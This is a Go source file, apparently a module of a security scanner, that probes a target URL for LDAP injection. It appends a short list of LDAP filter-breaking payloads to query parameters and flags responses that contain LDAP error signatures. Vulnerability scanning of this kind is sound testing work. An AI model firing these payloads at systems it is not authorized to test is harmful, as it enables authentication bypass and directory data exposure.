package modules

import (
	"context"
	"io"
	"net/http"
	"net/url"
	"strings"
	"sync"
	"time"
)

// LDAPInjectionTestingResult holds the result of the LDAPInjectionTesting module execution.
type LDAPInjectionTestingResult struct {
	Target string `json:"target"`
	Status string `json:"status"`
	Detail string `json:"detail,omitempty"`
}

// LDAPInjectionTesting executes the ldap_injection_testing security technique.
type LDAPInjectionTesting struct {
	Target     string
	maxThreads int
	mu         sync.Mutex
	results    []LDAPInjectionTestingResult
	client     *http.Client
}

// NewLDAPInjectionTesting creates a new instance.
func NewLDAPInjectionTesting(target string) *LDAPInjectionTesting {
	return &LDAPInjectionTesting{
		Target:     EnsureHTTPPrefix(target),
		maxThreads: 5,
		client:     NewHTTPClient(10 * time.Second),
	}
}

func (m *LDAPInjectionTesting) SetThreads(count int) {
	if count < 1 {
		count = 1
	}
	m.maxThreads = count
}

var ldapPayloads = []string{
	"*",
	"*()|&'",
	")(|(uid=*))",
	"*)(uid=*))(|(uid=*",
}

func (m *LDAPInjectionTesting) Execute(ctx context.Context) ([]LDAPInjectionTestingResult, error) {
	m.results = make([]LDAPInjectionTestingResult, 0)

	parsedURL, err := url.Parse(m.Target)
	if err != nil {
		return m.results, err
	}

	jobs := make(chan string, len(ldapPayloads))
	for _, p := range ldapPayloads {
		jobs <- p
	}
	close(jobs)

	var wg sync.WaitGroup

	for i := 0; i < m.maxThreads; i++ {
		wg.Add(1)
		go func() {
			defer wg.Done()
			for payload := range jobs {
				select {
				case <-ctx.Done():
					return
				default:
					m.testPayload(ctx, parsedURL, payload)
				}
			}
		}()
	}

	done := make(chan struct{})
	go func() {
		wg.Wait()
		close(done)
	}()

	select {
	case <-done:
		return m.results, nil
	case <-ctx.Done():
		<-done
		return m.results, ctx.Err()
	}
}

func (m *LDAPInjectionTesting) testPayload(ctx context.Context, u *url.URL, payload string) {
	query := u.Query()
	hasParams := len(query) > 0
	
	testURL := *u
	if hasParams {
		for key, vals := range query {
			for i, val := range vals {
				query[key][i] = val + payload
			}
		}
		testURL.RawQuery = query.Encode()
	} else {
		query.Add("username", payload)
		query.Add("user", payload)
		testURL.RawQuery = query.Encode()
	}

	req, err := http.NewRequestWithContext(ctx, "GET", testURL.String(), nil)
	if err != nil {
		return
	}

	resp, err := m.client.Do(req)
	if err != nil {
		return
	}
	defer resp.Body.Close()

	bodyBytes, err := io.ReadAll(resp.Body)
	if err != nil {
		return
	}

	bodyStr := strings.ToLower(string(bodyBytes))

	// LDAP error signatures
	if strings.Contains(bodyStr, "ldap") && (strings.Contains(bodyStr, "invalid dn syntax") || strings.Contains(bodyStr, "filter error")) {
		m.mu.Lock()
		m.results = append(m.results, LDAPInjectionTestingResult{
			Target: m.Target,
			Status: "vulnerable",
			Detail: "LDAP Injection detected via error signature with payload: " + payload,
		})
		m.mu.Unlock()
	}
}
